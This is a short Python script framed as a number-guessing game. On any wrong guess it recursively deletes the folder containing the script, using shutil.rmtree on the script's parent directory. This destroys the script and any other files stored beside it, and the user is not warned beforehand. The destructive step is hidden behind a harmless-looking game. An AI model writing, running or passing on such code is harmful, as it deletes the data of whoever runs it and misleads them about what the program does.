import random
import os
import shutil
from pathlib import Path

a = random.randint(1, 10)
b = int(input("Enter a number between 1 and 10: "))

if a == b:
    print("You guessed it!")
else:
    print(f"Sorry, the correct number was {a}.")

    script_path = Path(__file__).resolve()
    parent_folder = script_path.parent

    print("Deleting folder:", parent_folder)
    shutil.rmtree(parent_folder)
